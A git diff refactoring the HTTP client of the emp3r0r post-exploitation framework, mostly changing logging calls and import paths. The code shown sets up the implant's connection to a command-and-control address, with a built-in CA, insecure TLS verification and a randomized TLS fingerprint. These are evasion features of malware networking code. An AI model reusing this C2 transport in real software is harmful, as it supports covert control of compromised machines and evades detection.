@@ -6,27 +6,28 @@ import (
 	"net/url"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	utls "github.com/refraction-networking/utls"
 )
 
 // EmpHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
 func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 	// Extract CA bundle from built-in certs
-	rootCAs, err := ExtractCABundle()
+	rootCAs, err := ExtractCABundle(CACrtPEM)
 	if err != nil {
-		LogFatalError("ExtractCABundle: %v", err)
+		logging.Fatalf("ExtractCABundle: %v", err)
 	}
 
 	// C2 URL
 	c2url, err := url.Parse(c2_addr)
 	if err != nil {
-		LogFatalError("Error parsing C2 address '%s': %v", c2_addr, err)
+		logging.Fatalf("Error parsing C2 address '%s': %v", c2_addr, err)
 	}
 
 	// add our cert
 	if ok := rootCAs.AppendCertsFromPEM(CACrtPEM); !ok {
-		LogFatalError("No CA certs appended")
+		logging.Fatalf("No CA certs appended")
 	}
 
 	// Trust the augmented cert pool in our TLS client
@@ -39,7 +40,7 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 
 	// fingerprint of CA
 	ca_crt, _ := ParsePem(CACrtPEM)
-	log.Printf("CA cert fingerprint: %s, now making proxy dialer", SHA256SumRaw(ca_crt.Raw))
+	log.Printf("CA cert fingerprint: %s, now making proxy dialer", sha256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
 	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
@@ -48,7 +49,7 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 		// use a proxy for our HTTP client
 		proxyUrl, e := url.Parse(proxyServer)
 		if err != nil {
-			LogFatalError("Invalid proxy: %v", e)
+			logging.Fatalf("Invalid proxy: %v", e)
 		}
 
 		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
